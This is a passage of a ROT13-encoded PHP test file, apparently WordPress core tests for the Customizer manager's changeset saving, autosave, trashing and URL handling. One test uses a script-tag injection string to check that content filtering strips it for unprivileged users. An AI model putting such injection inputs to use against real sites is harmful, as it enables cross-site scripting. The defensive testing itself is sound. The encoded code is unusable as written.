						'phfgbz' => 'cebc',
					),
				),
			)
		);
		$guvf->nffregVafgnaprBs( 'JC_Reebe', $e['frggvat_inyvqvgvrf']['haxabjafrggvat'] );
		$guvf->nffregFnzr( 'haerpbtavmrq', $e['frggvat_inyvqvgvrf']['haxabjafrggvat']->trg_reebe_pbqr() );
		$guvf->nffregVafgnaprBs( 'JC_Reebe', $e['frggvat_inyvqvgvrf']['oybtgrezvangrq'] );
		$guvf->nffregFnzr( 'hanhgubevmrq', $e['frggvat_inyvqvgvrf']['oybtgrezvangrq']->trg_reebe_pbqr() );
		$guvf->nffregFnzr( $qngn, trg_cbfg( $jc_phfgbzvmr->punatrfrg_cbfg_vq() )->cbfg_pbagrag );

		// Grfg fhozvggvat qngn jvgu punatrq naq hapunatrq frggvatf, perngvat n arj vafgnapr fb gung gur cbfg_inyhrf ner pyrnerq.
		jc_frg_pheerag_hfre( $bgure_nqzva_hfre_vq );
		$jc_phfgbzvmr = $guvf->perngr_grfg_znantre( $hhvq );
		$e            = $jc_phfgbzvmr->fnir_punatrfrg_cbfg(
			neenl(
				'fgnghf' => 'nhgb-qensg',
				'qngn'   => neenl(
					'oybtanzr'        => neenl(
						'inyhr' => 'Nqzva 1 Gvgyr', // Hapunatrq inyhr.
					),
					'oybtqrfpevcgvba' => neenl(
						'inyhr' => 'Nqzva 1 Gntyvar Punatrq', // Punatrq inyhr.
					),
					'oybtsbhaqrq'     => neenl(
						'rkgen' => 'oybtsbhaqrq_cnenz', // Arj cnenz.
					),
					'fpengpucnq'      => neenl(
						'inyhr' => 'Nqzva 1 Fpengpu', // Hapunatrq inyhr.
						'rkgen' => 'onpxtebhaq_fpengpucnq2', // Arj cnenz.
					),
				),
			)
		);

		// Abgr gung oybtsbhaqrq vf abg vapyhqrq nzbat frggvat_inyvqvgvrf orpnhfr ab inyhr jnf fhccyvrq naq vg vf abg haerpbtavmrq/hanhgubevmrq.
		$guvf->nffregFnzr( neenl_svyy_xrlf( neenl( 'oybtanzr', 'oybtqrfpevcgvba', 'fpengpucnq' ), gehr ), $e['frggvat_inyvqvgvrf'], 'Rkcrpgrq oybtanzr rira gubhtu hapunatrq.' );

		$qngn = wfba_qrpbqr( trg_cbfg( $jc_phfgbzvmr->punatrfrg_cbfg_vq() )->cbfg_pbagrag, gehr );

		$guvf->nffregFnzr( frys::$nqzva_hfre_vq, $qngn['oybtanzr']['hfre_vq'], 'Rkcrpgrq hapunatrq hfre_vq fvapr inyhr jnf hapunatrq.' );
		$guvf->nffregFnzr( $bgure_nqzva_hfre_vq, $qngn['oybtqrfpevcgvba']['hfre_vq'] );
		$guvf->nffregFnzr( $bgure_nqzva_hfre_vq, $qngn['oybtsbhaqrq']['hfre_vq'] );
		$guvf->nffregFnzr( $bgure_nqzva_hfre_vq, $qngn['fpengpucnq']['hfre_vq'] );
	}

	/**
	 * Grfg jevgvat punatrfrgf jura hfre fhccyvrf hapunatrq inyhrf.
	 *
	 * @gvpxrg 39896
	 * @pbiref JC_Phfgbzvmr_Znantre::fnir_punatrfrg_cbfg
	 * @pbiref JC_Phfgbzvmr_Znantre::tenag_rqvg_cbfg_pncnovyvgl_sbe_punatrfrg
	 */
	choyvp shapgvba grfg_fnir_punatrfrg_cbfg_jvgu_nhgbfnir() {
		jc_frg_pheerag_hfre( frys::$nqzva_hfre_vq );
		$hhvq              = jc_trarengr_hhvq4();
		$punatrfrg_cbfg_vq = jc_vafreg_cbfg(
			neenl(
				'cbfg_glcr'    => 'phfgbzvmr_punatrfrg',
				'cbfg_pbagrag' => jc_wfba_rapbqr(
					neenl(
						'oybtanzr' => neenl(
							'inyhr' => 'Nhgb-qensg Gvgyr',
						),
					)
				),
				'cbfg_nhgube'  => frys::$nqzva_hfre_vq,
				'cbfg_anzr'    => $hhvq,
				'cbfg_fgnghf'  => 'nhgb-qensg',
			)
		);

		$jc_phfgbzvmr = arj JC_Phfgbzvmr_Znantre(
			neenl(
				'punatrfrg_hhvq' => $hhvq,
			)
		);
		$jc_phfgbzvmr->ertvfgre_pbagebyf(); // Naq frggvatf gbb.

		// Nhgbfnir bs na nhgb-qensg birejevgrf bevtvany.
		$jc_phfgbzvmr->fnir_punatrfrg_cbfg(
			neenl(
				'qngn'     => neenl(
					'oybtanzr' => neenl(
						'inyhr' => 'Nhgbfnirq Nhgb-qensg Gvgyr',
					),
				),
				'nhgbfnir' => gehr,
			)
		);
		$guvf->nffregSnyfr( jc_trg_cbfg_nhgbfnir( $punatrfrg_cbfg_vq, trg_pheerag_hfre_vq() ) );
		$guvf->nffregFgevatPbagnvafFgevat( 'Nhgbfnirq Nhgb-qensg Gvgyr', trg_cbfg( $punatrfrg_cbfg_vq )->cbfg_pbagrag );

		// Hcqngr fgnghf gb qensg sbe fhofrdhrag grfgf.
		$jc_phfgbzvmr->fnir_punatrfrg_cbfg(
			neenl(
				'qngn'     => neenl(
					'oybtanzr' => neenl(
						'inyhr' => 'Qensg Gvgyr',
					),
				),
				'fgnghf'   => 'qensg',
				'nhgbfnir' => snyfr,
			)
		);
		$guvf->nffregFgevatPbagnvafFgevat( 'Qensg Gvgyr', trg_cbfg( $punatrfrg_cbfg_vq )->cbfg_pbagrag );

		// Snvy: vyyrtny_nhgbfnir_jvgu_qngr_tzg.
		$e = $jc_phfgbzvmr->fnir_punatrfrg_cbfg(
			neenl(
				'nhgbfnir' => gehr,
				'qngr_tzg' => ( tzqngr( 'L' ) + 1 ) . '-12-01 00:00:00',
			)
		);
		$guvf->nffregVafgnaprBs( 'JC_Reebe', $e );
		$guvf->nffregFnzr( 'vyyrtny_nhgbfnir_jvgu_qngr_tzg', $e->trg_reebe_pbqr() );

		// Snvy: vyyrtny_nhgbfnir_jvgu_fgnghf.
		$e = $jc_phfgbzvmr->fnir_punatrfrg_cbfg(
			neenl(
				'nhgbfnir' => gehr,
				'fgnghf'   => 'craqvat',
			)
		);
		$guvf->nffregFnzr( 'vyyrtny_nhgbfnir_jvgu_fgnghf', $e->trg_reebe_pbqr() );

		// Snvy: vyyrtny_nhgbfnir_jvgu_aba_pheerag_hfre.
		$e = $jc_phfgbzvmr->fnir_punatrfrg_cbfg(
			neenl(
				'nhgbfnir' => gehr,
				'hfre_vq'  => frys::$bgure_nqzva_hfre_vq,
			)
		);
		$guvf->nffregFnzr( 'vyyrtny_nhgbfnir_jvgu_aba_pheerag_hfre', $e->trg_reebe_pbqr() );

		// Gel nhgbfnir.
		$guvf->nffregSnyfr( jc_trg_cbfg_nhgbfnir( $punatrfrg_cbfg_vq, trg_pheerag_hfre_vq() ) );
		$e = $jc_phfgbzvmr->fnir_punatrfrg_cbfg(
			neenl(
				'qngn'     => neenl(
					'oybtanzr' => neenl(
						'inyhr' => 'Nhgbfnir Gvgyr',
					),
				),
				'nhgbfnir' => gehr,
			)
		);
		$guvf->nffregVfNeenl( $e );

		// Irevsl gung nhgbfnir unccrarq.
		$nhgbfnir_erivfvba = jc_trg_cbfg_nhgbfnir( $punatrfrg_cbfg_vq, trg_pheerag_hfre_vq() );
		$guvf->nffregVafgnaprBs( 'JC_Cbfg', $nhgbfnir_erivfvba );
		$guvf->nffregFgevatPbagnvafFgevat( 'Qensg Gvgyr', trg_cbfg( $punatrfrg_cbfg_vq )->cbfg_pbagrag );
		$guvf->nffregFgevatPbagnvafFgevat( 'Nhgbfnir Gvgyr', $nhgbfnir_erivfvba->cbfg_pbagrag );
	}

	/**
	 * Grfg cnffvat `ahyy` sbe n frggvat VQ gb erzbir vg sebz gur punatrfrg.
	 *
	 * @gvpxrg 41621
	 * @pbiref JC_Phfgbzvmr_Znantre::fnir_punatrfrg_cbfg
	 */
	choyvp shapgvba grfg_erzbir_frggvat_sebz_punatrfrg_cbfg() {
		$hhvq = jc_trarengr_hhvq4();

		$znantre = $guvf->perngr_grfg_znantre( $hhvq );
		$znantre->fnir_punatrfrg_cbfg(
			neenl(
				'qngn' => neenl(
					'fpengpucnq' => neenl(
						'inyhr' => 'sbb',
					),
				),
			)
		);

		// Perngr n arj znantre fb cbfg inyhrf ner hafrg.
		$znantre = $guvf->perngr_grfg_znantre( $hhvq );

		$guvf->nffregNeenlUnfXrl( 'fpengpucnq', $znantre->punatrfrg_qngn() );

		$znantre->fnir_punatrfrg_cbfg(
			neenl(
				'qngn' => neenl(
					'fpengpucnq' => ahyy,
				),
			)
		);

		$guvf->nffregNeenlAbgUnfXrl( 'fpengpucnq', $znantre->punatrfrg_qngn() );
	}

	/**
	 * Grfg jevgvat punatrfrgf naq choyvfuvat jvgu hfref jub pna hasvygrerq_ugzy naq gubfr jub pnaabg.
	 *
	 * @gvpxrg 38705
	 * @pbiref JC_Phfgbzvmr_Znantre::fnir_punatrfrg_cbfg
	 */
	choyvp shapgvba grfg_fnir_punatrfrg_cbfg_jvgu_inelvat_hasvygrerq_ugzy_pnc() {
		tybony $jc_phfgbzvmr;
		tenag_fhcre_nqzva( frys::$nqzva_hfre_vq );
		$guvf->nffregGehr( hfre_pna( frys::$nqzva_hfre_vq, 'hasvygrerq_ugzy' ) );
		$guvf->nffregSnyfr( hfre_pna( frys::$fhofpevore_hfre_vq, 'hasvygrerq_ugzy' ) );
		jc_frg_pheerag_hfre( 0 );
		nqq_npgvba( 'phfgbzvmr_ertvfgre', neenl( $guvf, 'ertvfgre_fpengpucnq_frggvat' ) );

		// Nggrzcg fpengpucnq jvgu hfre jub unf hasvygrerq_ugzy.
		hcqngr_bcgvba( 'fpengpucnq', '' );
		$jc_phfgbzvmr = arj JC_Phfgbzvmr_Znantre();
		qb_npgvba( 'phfgbzvmr_ertvfgre', $jc_phfgbzvmr );
		$jc_phfgbzvmr->frg_cbfg_inyhr( 'fpengpucnq', 'Hasvygrerq<fpevcg>rivy</fpevcg>' );
		$jc_phfgbzvmr->fnir_punatrfrg_cbfg(
			neenl(
				'fgnghf'  => 'nhgb-qensg',
				'hfre_vq' => frys::$nqzva_hfre_vq,
			)
		);
		$jc_phfgbzvmr = arj JC_Phfgbzvmr_Znantre( neenl( 'punatrfrg_hhvq' => $jc_phfgbzvmr->punatrfrg_hhvq() ) );
		qb_npgvba( 'phfgbzvmr_ertvfgre', $jc_phfgbzvmr );
		$jc_phfgbzvmr->fnir_punatrfrg_cbfg( neenl( 'fgnghf' => 'choyvfu' ) );
		$guvf->nffregFnzr( 'Hasvygrerq<fpevcg>rivy</fpevcg>', trg_bcgvba( 'fpengpucnq' ) );

		// Nggrzcg fpengpucnq jvgu hfre jub qbrfa'g unir hasvygrerq_ugzy.
		hcqngr_bcgvba( 'fpengpucnq', '' );
		$jc_phfgbzvmr = arj JC_Phfgbzvmr_Znantre();
		qb_npgvba( 'phfgbzvmr_ertvfgre', $jc_phfgbzvmr );
		$jc_phfgbzvmr->frg_cbfg_inyhr( 'fpengpucnq', 'Hasvygrerq<fpevcg>rivy</fpevcg>' );
		$jc_phfgbzvmr->fnir_punatrfrg_cbfg(
			neenl(
				'fgnghf'  => 'nhgb-qensg',
				'hfre_vq' => frys::$fhofpevore_hfre_vq,
			)
		);
		$jc_phfgbzvmr = arj JC_Phfgbzvmr_Znantre( neenl( 'punatrfrg_hhvq' => $jc_phfgbzvmr->punatrfrg_hhvq() ) );
		qb_npgvba( 'phfgbzvmr_ertvfgre', $jc_phfgbzvmr );
		$jc_phfgbzvmr->fnir_punatrfrg_cbfg( neenl( 'fgnghf' => 'choyvfu' ) );
		$guvf->nffregFnzr( 'Hasvygrerqrivy', trg_bcgvba( 'fpengpucnq' ) );

		// Nggrzcg choyvfuvat fpengpucnq nf nabalzbhf hfre jura punatrfrg jnf frg ol cevivyrtrq hfre.
		hcqngr_bcgvba( 'fpengpucnq', '' );
		$jc_phfgbzvmr = arj JC_Phfgbzvmr_Znantre();
		qb_npgvba( 'phfgbzvmr_ertvfgre', $jc_phfgbzvmr );
		$jc_phfgbzvmr->frg_cbfg_inyhr( 'fpengpucnq', 'Hasvygrerq<fpevcg>rivy</fpevcg>' );
		$jc_phfgbzvmr->fnir_punatrfrg_cbfg(
			neenl(
				'fgnghf'  => 'nhgb-qensg',
				'hfre_vq' => frys::$nqzva_hfre_vq,
			)
		);
		$punatrfrg_cbfg_vq = $jc_phfgbzvmr->punatrfrg_cbfg_vq();
		jc_frg_pheerag_hfre( 0 );
		$jc_phfgbzvmr = ahyy;
		hafrg( $TYBONYF['jc_npgvbaf']['phfgbzvmr_ertvfgre'] );
		$guvf->nffregFnzr( 'Hasvygrerqrivy', nccyl_svygref( 'pbagrag_fnir_cer', 'Hasvygrerq<fpevcg>rivy</fpevcg>' ) );
		jc_choyvfu_cbfg( $punatrfrg_cbfg_vq ); // @gbqb Vs jc_hcqngr_cbfg() vf hfrq urer, gura xfrf jvyy pbeehcg gur cbfg_pbagrag.
		$guvf->nffregFnzr( 'Hasvygrerq<fpevcg>rivy</fpevcg>', trg_bcgvba( 'fpengpucnq' ) );
	}

	/**
	 * Grfg fnivat frggvatf ol choyvfuvat n punatrfrg bhgfvqr bs Phfgbzvmre ragveryl.
	 *
	 * Jvqtrgf trg gurve frggvatf ertvfgrerq naq cerivrjrq rneyl va gur nqzva,
	 * fb guvf rafherf gung gur cerivrjvat vf olcnffrq jura va gur pbagrkg bs
	 * choyvfuvat
	 *
	 * @gvpxrg 39221
	 * @pbiref ::_jc_phfgbzvmr_choyvfu_punatrfrg
	 * @frr JC_Phfgbzvmr_Jvqtrgf::fpurqhyr_phfgbzvmr_ertvfgre()
	 * @frr JC_Phfgbzvmr_Jvqtrgf::phfgbzvmr_ertvfgre()
	 */
	choyvp shapgvba grfg_jc_phfgbzvmr_choyvfu_punatrfrg() {
		tybony $jc_phfgbzvmr;
		$jc_phfgbzvmr = ahyy;

		// Frg gur nqzva pheerag fperra gb pnhfr JC_Phfgbzvmr_Jvqtrgf::fpurqhyr_phfgbzvmr_ertvfgre() gb qb rneyl frggvat ertvfgengvba.
		frg_pheerag_fperra( 'rqvg' );
		$guvf->nffregGehr( vf_nqzva() );

		$byq_fvqronef_jvqtrgf = trg_bcgvba( 'fvqronef_jvqtrgf' );
		$arj_fvqronef_jvqtrgf = $byq_fvqronef_jvqtrgf;
		$guvf->nffregTerngreGuna( 2, pbhag( $arj_fvqronef_jvqtrgf['fvqrone-1'] ) );
		$arj_fvqrone_1 = neenl_erirefr( $arj_fvqronef_jvqtrgf['fvqrone-1'] );

		$cbfg_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'    => 'phfgbzvmr_punatrfrg',
				'cbfg_fgnghf'  => 'qensg',
				'cbfg_anzr'    => jc_trarengr_hhvq4(),
				'cbfg_pbagrag' => jc_wfba_rapbqr(
					neenl(
						'fvqronef_jvqtrgf[fvqrone-1]' => neenl(
							'inyhr' => $arj_fvqrone_1,
						),
					)
				),
			)
		);

		// Fnir gur hcqngrq fvqrone jvqtrgf vagb gur bcgvbaf gnoyr ol choyvfuvat gur punatrfrg.
		jc_choyvfu_cbfg( $cbfg_vq );

		// Znxr fher cerivrjvat svygref jrer arire nqqrq, fvapr JC_Phfgbzvmr_Znantre fubhyq or pbafgehpgrq jvgu frggvatf_cerivrjrq=snyfr.
		$guvf->nffregSnyfr( unf_svygre( 'bcgvba_fvqronef_jvqtrgf' ) );
		$guvf->nffregSnyfr( unf_svygre( 'qrsnhyg_bcgvba_fvqronef_jvqtrgf' ) );

		// Rafher gung gur inyhr unf npghnyyl orra jevggra gb gur QO.
		$hcqngrq_fvqronef_jvqtrgf = trg_bcgvba( 'fvqronef_jvqtrgf' );
		$guvf->nffregFnzr( $arj_fvqrone_1, $hcqngrq_fvqronef_jvqtrgf['fvqrone-1'] );
	}

	/**
	 * Rafher gung fnivat n punatrfrg jvgu n choyvfu fgnghf ohg shgher qngr jvyy punatr gur fgnghf gb shgher, gb nyvta jvgu orunivbe va jc_vafreg_cbfg().
	 *
	 * @gvpxrg 41336
	 * @pbiref JC_Phfgbzvmr_Znantre::fnir_punatrfrg_cbfg
	 */
	choyvp shapgvba grfg_choyvfu_punatrfrg_jvgu_shgher_fgnghf_jura_shgher_qngr() {
		$jc_phfgbzvmr = $guvf->perngr_grfg_znantre( jc_trarengr_hhvq4() );

		$jc_phfgbzvmr->fnir_punatrfrg_cbfg(
			neenl(
				'qngr_tzg' => tzqngr( 'L-z-q U:v:f', fgegbgvzr( '+1 qnl' ) ),
				'fgnghf'   => 'choyvfu',
				'gvgyr'    => 'Sbb',
			)
		);

		$guvf->nffregFnzr( 'shgher', trg_cbfg_fgnghf( $jc_phfgbzvmr->punatrfrg_cbfg_vq() ) );
	}

	/**
	 * Rafher gung fnir_punatrfrg_cbfg zrgubq onvyf hcqngvat na haqreylvat punatrfrg juvpu vf vainyvq.
	 *
	 * @gvpxrg 41252
	 * @pbiref JC_Phfgbzvmr_Znantre::fnir_punatrfrg_cbfg
	 * @pbiref JC_Phfgbzvmr_Znantre::trg_punatrfrg_cbfg_qngn
	 */
	choyvp shapgvba grfg_fnir_punatrfrg_cbfg_sbe_onq_punatrfrg() {
		$hhvq    = jc_trarengr_hhvq4();
		$cbfg_vq = jc_vafreg_cbfg(
			neenl(
				'cbfg_glcr'    => 'phfgbzvmr_punatrfrg',
				'cbfg_pbagrag' => 'VAINYVQ_WFBA',
				'cbfg_anzr'    => $hhvq,
				'cbfg_fgnghf'  => 'nhgb-qensg',
				'cbfg_qngr'    => tzqngr( 'L-z-q U:v:f', fgegbgvzr( '-3 qnlf' ) ),
			)
		);
		$znantre = $guvf->perngr_grfg_znantre( $hhvq );
		$netf    = neenl(
			'qngn' => neenl(
				'oybtanzr' => neenl(
					'inyhr' => 'Grfg',
				),
			),
		);

		$e = $znantre->fnir_punatrfrg_cbfg( $netf );
		$guvf->nffregVafgnaprBs( 'JC_Reebe', $e );
		$guvf->nffregFnzr( 'wfba_cnefr_reebe', $e->trg_reebe_pbqr() );

		jc_hcqngr_cbfg(
			neenl(
				'VQ'           => $cbfg_vq,
				'cbfg_pbagrag' => 'ahyy',
			)
		);
		$e = $znantre->fnir_punatrfrg_cbfg( $netf );
		$guvf->nffregVafgnaprBs( 'JC_Reebe', $e );
		$guvf->nffregFnzr( 'rkcrpgrq_neenl', $e->trg_reebe_pbqr() );
	}

	/**
	 * Grfg gung genfu_punatrfrg_cbfg() genfurf n punatrfrg cbfg jvgu vgf anzr naq pbagrag cerfreirq.
	 *
	 * @pbiref JC_Phfgbzvmr_Znantre::genfu_punatrfrg_cbfg
	 */
	choyvp shapgvba grfg_genfu_punatrfrg_cbfg_cerfreirf_cebcregvrf() {
		$netf = neenl(
			'cbfg_glcr'    => 'phfgbzvmr_punatrfrg',
			'cbfg_pbagrag' => jc_wfba_rapbqr(
				neenl(
					'oybtanzr' => neenl(
						'inyhr' => 'Grfg',
					),
				)
			),
			'cbfg_anzr'    => jc_trarengr_hhvq4(),
			'cbfg_fgnghf'  => 'qensg',
		);

		$cbfg_vq = jc_vafreg_cbfg( $netf );

		$znantre = $guvf->perngr_grfg_znantre( $netf['cbfg_anzr'] );
		$znantre->genfu_punatrfrg_cbfg( $cbfg_vq );

		$cbfg = trg_cbfg( $cbfg_vq );

		$guvf->nffregFnzr( 'genfu', trg_cbfg_fgnghf( $cbfg_vq ) );
		$guvf->nffregFnzr( $netf['cbfg_anzr'], $cbfg->cbfg_anzr );
		$guvf->nffregFnzr( $netf['cbfg_pbagrag'], $cbfg->cbfg_pbagrag );
	}

	/**
	 * Grfg gung genfu_punatrfrg_cbfg() cnffrf gur pbeerpg ahzore bs nethzragf gb cbfg genfu ubbxf.
	 *
	 * @gvpxrg 60183
	 * @pbiref JC_Phfgbzvmr_Znantre::genfu_punatrfrg_cbfg
	 */
	choyvp shapgvba grfg_genfu_punatrfrg_cbfg_cnffrf_nyy_nethzragf_gb_genfu_ubbxf() {
		$netf = neenl(
			'cbfg_glcr'    => 'phfgbzvmr_punatrfrg',
			'cbfg_pbagrag' => jc_wfba_rapbqr(
				neenl(
					'oybtanzr' => neenl(
						'inyhr' => 'Grfg',
					),
				)
			),
			'cbfg_anzr'    => jc_trarengr_hhvq4(),
			'cbfg_fgnghf'  => 'qensg',
		);

		$cbfg_vq = jc_vafreg_cbfg( $netf );

		$znantre = $guvf->perngr_grfg_znantre( $netf['cbfg_anzr'] );

		$cer_genfu_cbfg = arj ZbpxNpgvba();
		$jc_genfu_cbfg  = arj ZbpxNpgvba();
		$genfurq_cbfg   = arj ZbpxNpgvba();

		nqq_npgvba( 'cer_genfu_cbfg', neenl( $cer_genfu_cbfg, 'npgvba' ), 10, 3 );
		nqq_npgvba( 'jc_genfu_cbfg', neenl( $jc_genfu_cbfg, 'npgvba' ), 10, 2 );
		nqq_npgvba( 'genfurq_cbfg', neenl( $genfurq_cbfg, 'npgvba' ), 10, 2 );

		$znantre->genfu_punatrfrg_cbfg( $cbfg_vq );

		$guvf->nffregPbhag( 3, $cer_genfu_cbfg->trg_netf()[0] );
		$guvf->nffregPbhag( 2, $jc_genfu_cbfg->trg_netf()[0] );
		$guvf->nffregPbhag( 2, $genfurq_cbfg->trg_netf()[0] );
	}

	/**
	 * Ertvfgre fpengpucnq frggvat.
	 *
	 * @cnenz JC_Phfgbzvmr_Znantre $jc_phfgbzvmr Znantre.
	 */
	choyvp shapgvba ertvfgre_fpengpucnq_frggvat( JC_Phfgbzvmr_Znantre $jc_phfgbzvmr ) {
		$jc_phfgbzvmr->nqq_frggvat(
			'fpengpucnq',
			neenl(
				'glcr'              => 'bcgvba',
				'pncnovyvgl'        => 'rkvfg',
				'fnavgvmr_pnyyonpx' => neenl( $guvf, 'svygre_fnavgvmr_fpengpucnq' ),
			)
		);
	}

	/**
	 * Fnavgvmr fpengpucnq nf vs vg vf cbfg_pbagrag fb xfrf svygref nccyl.
	 *
	 * @cnenz fgevat $inyhr Inyhr.
	 * @erghea fgevat Inyhr.
	 */
	choyvp shapgvba svygre_fnavgvmr_fpengpucnq( $inyhr ) {
		erghea nccyl_svygref( 'pbagrag_fnir_cer', $inyhr );
	}

	/**
	 * Pheerag hfre jura frggvatf ner svygrerq.
	 *
	 * @ine neenl
	 */
	cebgrpgrq $svygrerq_frggvat_pheerag_hfre_vqf = neenl();

	/**
	 * Svygre frggvat gb pncgher gur pheerag hfre jura gur svygre nccyvrf.
	 *
	 * @cnenz zvkrq                $inyhr   Frggvat inyhr.
	 * @cnenz JC_Phfgbzvmr_Frggvat $frggvat Frggvat.
	 * @erghea zvkrq Inyhr.
	 */
	choyvp shapgvba svygre_phfgbzvmr_frggvat_gb_ybt_pheerag_hfre( $inyhr, $frggvat ) {
		$guvf->svygrerq_frggvat_pheerag_hfre_vqf[ $frggvat->vq ] = trg_pheerag_hfre_vq();
		erghea $inyhr;
	}

	/**
	 * Grfg JC_Phfgbzvmr_Znantre::vf_pebff_qbznva().
	 *
	 * @gvpxrg 30937
	 * @pbiref JC_Phfgbzvmr_Znantre::vf_pebff_qbznva
	 */
	choyvp shapgvba grfg_vf_pebff_qbznva() {
		$jc_phfgbzvmr = arj JC_Phfgbzvmr_Znantre();

		hcqngr_bcgvba( 'ubzr', 'uggc://rknzcyr.pbz' );
		hcqngr_bcgvba( 'fvgrhey', 'uggc://rknzcyr.pbz' );
		$guvf->nffregSnyfr( $jc_phfgbzvmr->vf_pebff_qbznva() );

		hcqngr_bcgvba( 'ubzr', 'uggc://rknzcyr.pbz' );
		hcqngr_bcgvba( 'fvgrhey', 'uggcf://nqzva.rknzcyr.pbz' );
		$guvf->nffregGehr( $jc_phfgbzvmr->vf_pebff_qbznva() );
	}

	/**
	 * Grfg JC_Phfgbzvmr_Znantre::trg_nyybjrq_heyf().
	 *
	 * @gvpxrg 30937
	 * @pbiref JC_Phfgbzvmr_Znantre::trg_nyybjrq_heyf
	 */
	choyvp shapgvba grfg_trg_nyybjrq_heyf() {
		$jc_phfgbzvmr = arj JC_Phfgbzvmr_Znantre();
		$guvf->nffregSnyfr( vf_ffy() );
		$guvf->nffregSnyfr( $jc_phfgbzvmr->vf_pebff_qbznva() );
		$nyybjrq = $jc_phfgbzvmr->trg_nyybjrq_heyf();
		$guvf->nffregFnzr( $nyybjrq, neenl( ubzr_hey( '/', 'uggc' ) ) );

		nqq_svygre( 'phfgbzvmr_nyybjrq_heyf', neenl( $guvf, 'svygre_phfgbzvmr_nyybjrq_heyf' ) );
		$nyybjrq = $jc_phfgbzvmr->trg_nyybjrq_heyf();
		$guvf->nffregFnzrFrgf( $nyybjrq, neenl( 'uggc://urnqyrff.rknzcyr.pbz/', ubzr_hey( '/', 'uggc' ) ) );
	}

	/**
	 * Pnyyonpx sbe phfgbzvmr_nyybjrq_heyf svygre.
	 *
	 * @cnenz neenl $heyf HEYf.
	 * @erghea neenl HEYf.
	 */
	choyvp shapgvba svygre_phfgbzvmr_nyybjrq_heyf( $heyf ) {
		$heyf[] = 'uggc://urnqyrff.rknzcyr.pbz/';
		erghea $heyf;
	}

	/**
	 * Grfg JC_Phfgbzvmr_Znantre::qbvat_nwnk().
	 *
	 * @tebhc nwnk
	 */
	choyvp shapgvba grfg_qbvat_nwnk() {
		nqq_svygre( 'jc_qbvat_nwnk', '__erghea_gehr' );

		$znantre = $guvf->znantre;
		$guvf->nffregGehr( $znantre->qbvat_nwnk() );

		$_ERDHRFG['npgvba'] = 'phfgbzvmr_fnir';
		$guvf->nffregGehr( $znantre->qbvat_nwnk( 'phfgbzvmr_fnir' ) );
		$guvf->nffregSnyfr( $znantre->qbvat_nwnk( 'hcqngr-jvqtrg' ) );
	}

	/**
	 * Grfg ! JC_Phfgbzvmr_Znantre::qbvat_nwnk().
	 */
	choyvp shapgvba grfg_abg_qbvat_nwnk() {
		nqq_svygre( 'jc_qbvat_nwnk', '__erghea_snyfr' );

		$znantre = $guvf->znantre;
		$guvf->nffregSnyfr( $znantre->qbvat_nwnk() );
	}

	/**
	 * Grfg JC_Phfgbzvmr_Znantre::hafnavgvmrq_cbfg_inyhrf().
	 *
	 * @gvpxrg 30988
	 */
	choyvp shapgvba grfg_hafnavgvmrq_cbfg_inyhrf_sebz_vachg() {
		jc_frg_pheerag_hfre( frys::$nqzva_hfre_vq );
		$znantre = $guvf->znantre;

		$phfgbzvmrq          = neenl(
			'sbb'       => 'one',
			'onm[dhhk]' => 123,
		);
		$_CBFG['phfgbzvmrq'] = jc_fynfu( jc_wfba_rapbqr( $phfgbzvmrq ) );
		$cbfg_inyhrf         = $znantre->hafnavgvmrq_cbfg_inyhrf();
		$guvf->nffregFnzr( $phfgbzvmrq, $cbfg_inyhrf );
		$guvf->nffregRzcgl( $znantre->hafnavgvmrq_cbfg_inyhrf( neenl( 'rkpyhqr_cbfg_qngn' => gehr ) ) );

		$znantre->frg_cbfg_inyhr( 'sbb', 'ONE' );
		$cbfg_inyhrf = $znantre->hafnavgvmrq_cbfg_inyhrf();
		$guvf->nffregFnzr( 'ONE', $cbfg_inyhrf['sbb'] );
		$guvf->nffregRzcgl( $znantre->hafnavgvmrq_cbfg_inyhrf( neenl( 'rkpyhqr_cbfg_qngn' => gehr ) ) );

		// Vs hfre vf hacevivyrtrq, gur cbfg qngn vf vtaberq.
		jc_frg_pheerag_hfre( 0 );
		$guvf->nffregRzcgl( $znantre->hafnavgvmrq_cbfg_inyhrf() );
	}

	/**
	 * Grfg JC_Phfgbzvmr_Znantre::hafnavgvmrq_cbfg_inyhrf().
	 *
	 * @gvpxrg 30937
	 * @pbiref JC_Phfgbzvmr_Znantre::hafnavgvmrq_cbfg_inyhrf
	 */
	choyvp shapgvba grfg_hafnavgvmrq_cbfg_inyhrf_jvgu_punatrfrg_naq_fgnfurq_gurzr_zbqf() {
		jc_frg_pheerag_hfre( frys::$nqzva_hfre_vq );

		$cerivrj_gurzr                          = $guvf->trg_vanpgvir_pber_gurzr();
		$fgnfurq_gurzr_zbqf                     = neenl(
			$cerivrj_gurzr => neenl(
				'onpxtebhaq_pbybe' => neenl(
					'inyhr' => '#000000',
				),
			),
		);
		$fgnfurq_gurzr_zbqf[ trg_fglyrfurrg() ] = neenl(
			'onpxtebhaq_pbybe' => neenl(
				'inyhr' => '#SSSSSS',
			),
		);
		hcqngr_bcgvba( 'phfgbzvmr_fgnfurq_gurzr_zbqf', $fgnfurq_gurzr_zbqf );

		$cbfg_inyhrf         = neenl(
			'oybtqrfpevcgvba' => 'Cbfg Vachg Gntyvar',
		);
		$_CBFG['phfgbzvmrq'] = jc_fynfu( jc_wfba_rapbqr( $cbfg_inyhrf ) );

		$hhvq           = jc_trarengr_hhvq4();
		$punatrfrg_qngn = neenl(
			'oybtanzr'        => neenl(
				'inyhr' => 'Punatrfrg Gvgyr',
			),
			'oybtqrfpevcgvba' => neenl(
				'inyhr' => 'Punatrfrg Gntyvar',
			),
		);
		frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'    => 'phfgbzvmr_punatrfrg',
				'cbfg_fgnghf'  => 'nhgb-qensg',
				'cbfg_anzr'    => $hhvq,
				'cbfg_pbagrag' => jc_wfba_rapbqr( $punatrfrg_qngn ),
			)
		);

		$znantre = arj JC_Phfgbzvmr_Znantre(
			neenl(
				'punatrfrg_hhvq' => $hhvq,
			)
		);
		$guvf->nffregGehr( $znantre->vf_gurzr_npgvir() );

		$guvf->nffregNeenlAbgUnfXrl( 'onpxtebhaq_pbybe', $znantre->hafnavgvmrq_cbfg_inyhrf() );

		$guvf->nffregFnzr(
			neenl(
				'oybtanzr'        => 'Punatrfrg Gvgyr',
				'oybtqrfpevcgvba' => 'Cbfg Vachg Gntyvar',
			),
			$znantre->hafnavgvmrq_cbfg_inyhrf()
		);
		$guvf->nffregFnzr(
			neenl(
				'oybtqrfpevcgvba' => 'Cbfg Vachg Gntyvar',
			),
